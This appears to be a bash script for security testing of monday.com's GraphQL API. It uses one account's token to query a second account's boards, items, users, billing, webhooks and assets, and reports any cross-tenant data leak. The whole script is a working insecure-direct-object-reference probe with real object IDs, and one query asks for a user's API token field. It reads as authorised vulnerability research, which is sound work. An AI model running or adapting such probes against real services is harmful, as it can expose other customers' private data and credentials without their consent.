#!/usr/bin/env bash
# run-bc.sh - account B's token against account C's objects.
#
#   export TOKEN_B='<uid 115702202 / actid 36786355>'
#   export TOKEN_C='<uid 115703279 / actid 36786534>'
#   bash run-bc.sh
#
# Read-only. Every request is a query; no mutation is sent.
# A response containing C's data while authenticated as B is the finding.

set -uo pipefail

: "${TOKEN_B:?export TOKEN_B first}"
: "${TOKEN_C:?export TOKEN_C first}"

# account C's objects, from the TOKEN_C enumeration
C_ACCOUNT=36786534
C_USER=115703279
C_BOARD=5103704617
C_ITEMS_ESC='\"3209838125\",\"3209838126\",\"3209838127\"'
C_ITEM=3209838125
C_BOARD_NAME="asfasf"        # what a successful cross-tenant read should contain
C_ITEM_NAME="dasf"

API=https://api.monday.com/v2
DELAY="${DELAY:-1}"
C_R=$'\033[31m'; C_G=$'\033[32m'; C_Y=$'\033[33m'
C_B=$'\033[1m'; C_D=$'\033[2m'; C_0=$'\033[0m'

# q <token> <query-with-json-escaped-quotes> -> body in $BODY
q() {
  BODY=$(curl -s "$API" -H "Authorization: $1" \
           -H 'Content-Type: application/json' \
           --max-time 25 -d "{\"query\":\"$2\"}" 2>/dev/null)
  sleep "$DELAY"
}

# check <label> <query> [needle]
check() {
  local label="$1" query="$2" needle="${3:-}"
  q "$TOKEN_B" "$query"
  local verdict body_short has_data has_errors
  body_short=$(printf '%s' "$BODY" | head -c 400)

  printf '%s' "$BODY" | grep -q '"data":' && has_data=1 || has_data=0
  printf '%s' "$BODY" | grep -qE '"errors":|"error_message":|"error_code":' \
    && has_errors=1 || has_errors=0

  if [ -z "$BODY" ]; then
    verdict="${C_Y}EMPTY ${C_0}"
  elif printf '%s' "$BODY" | grep -q 'Cannot query field'; then
    verdict="${C_D}ABSENT${C_0}"
  elif printf '%s' "$BODY" | grep -q 'error code: 1015'; then
    verdict="${C_Y}RATELIMIT${C_0}"
  elif [ -n "$needle" ] && [ "$has_data" = 1 ] && [ "$has_errors" = 0 ] \
       && printf '%s' "$BODY" | grep -qF "$needle"; then
    # C's own object name came back in a clean data response, as B
    verdict="${C_R}${C_B}CROSS-TENANT HIT${C_0}"
  elif [ "$has_errors" = 1 ]; then
    verdict="${C_G}denied${C_0}"
  elif printf '%s' "$BODY" | grep -qE '"data":\{"[a-z_]*":(null|\[\])'; then
    verdict="${C_G}empty ${C_0}"
  elif [ "$has_data" = 1 ]; then
    verdict="${C_Y}DATA? ${C_0}"
  else
    verdict="${C_Y}?     ${C_0}"
  fi

  printf '  %b  %s\n' "$verdict" "$label"
  printf '     %s%s%s\n' "$C_D" "$body_short" "$C_0"
  echo
}

echo
echo "${C_B}=== B (36786355) reading C (36786534) ===${C_0}"
echo "${C_D}  a hit contains \"$C_BOARD_NAME\" or \"$C_ITEM_NAME\" - C's own object names${C_0}"
echo

echo "${C_B}[control] confirm which account each token is${C_0}"
q "$TOKEN_B" '{ me { id name account { id slug } } }'; echo "  B: $BODY"
q "$TOKEN_C" '{ me { id name account { id slug } } }'; echo "  C: $BODY"
echo
case "$BODY" in
  *"$C_ACCOUNT"*) ;;
  *) echo "${C_Y}  warning: TOKEN_C did not report account $C_ACCOUNT."
     echo "  the ids baked into this script came from that token. check the pairing.${C_0}"; echo ;;
esac

check "boards(ids:) - C's board" \
  "{ boards(ids: [\\\"$C_BOARD\\\"]) { id name items_count permissions owners { id name email } } }" \
  "$C_BOARD_NAME"

check "items(ids:) - C's items" \
  "{ items(ids: [$C_ITEMS_ESC]) { id name url board { id name } } }" \
  "$C_ITEM_NAME"

check "dependency_column_config - auth from arguments" \
  "{ dependency_column_config(board_id: \\\"$C_BOARD\\\", account_id: \\\"$C_ACCOUNT\\\", user_id: \\\"$C_USER\\\") { board_id dependency_columns { id account_id board_id data } } }" \
  "$C_BOARD"

check "export_graph(boardId:) - C's board structure" \
  "{ export_graph(boardId: \\\"$C_BOARD\\\") { boardId nodeCount edgeCount } }" \
  "$C_BOARD"

check "board_dependencies(board_id:)" \
  "{ board_dependencies(board_id: \\\"$C_BOARD\\\", limit: 2) { total_count items { item_id } } }" \
  ""

check "webhooks(board_id:) - endpoint config" \
  "{ webhooks(board_id: \\\"$C_BOARD\\\") { id event config } }" ""

check "aggregate over C's board - IDOR-09" \
  "{ aggregate(query: { from: { type: TABLE, id: \\\"$C_BOARD\\\" }, select: [{ type: FUNCTION, function: { function: COUNT_ITEMS }, as: \\\"n\\\" }] }) { results { entries { alias value { ... on AggregateBasicAggregationResult { result } } } } } }" \
  ""

check "app_subscriptions(account_id:) - C's billing" \
  "{ app_subscriptions(app_id: \\\"10000005\\\", account_id: $C_ACCOUNT) { total_count subscriptions { account_id plan_id monthly_price currency renewal_date } } }" \
  "monthly_price"

check "app_installs(account_id:)" \
  "{ app_installs(app_id: \\\"10000005\\\", account_id: \\\"$C_ACCOUNT\\\") { app_id timestamp app_install_account { id } } }" \
  ""

check "users(ids:) - C's user + the deprecated token field" \
  "{ users(ids: [\\\"$C_USER\\\"]) { id name email encrypt_api_token } }" \
  "$C_USER"

check "assets(ids:) - needs a file uploaded to C first" \
  "{ assets(ids: [\\\"1\\\"]) { id name public_url } }" ""

echo "${C_B}--- how to read this ---${C_0}"
cat <<'MSG'
  CROSS-TENANT HIT  C's object name came back in a clean data response while
                    authenticated as B. Read the body to confirm, then it is a finding.
  denied            an errors[] came back. The control is working.
  empty             resolved to null or [] - authorised away cleanly.
  DATA?             returned data without C's name in it. Read the body:
                    an empty list is a pass, C's content is a hit.
  ABSENT            field is not in the schema.
  RATELIMIT         Cloudflare 1015. Every result after this is meaningless.
                    Wait, raise DELAY (DELAY=5 bash run-bc.sh), re-run.

  Still to do: upload a file to account C and re-run assets(ids:) with its id.
  That is the highest-value test and it cannot run until C has an asset.
MSG
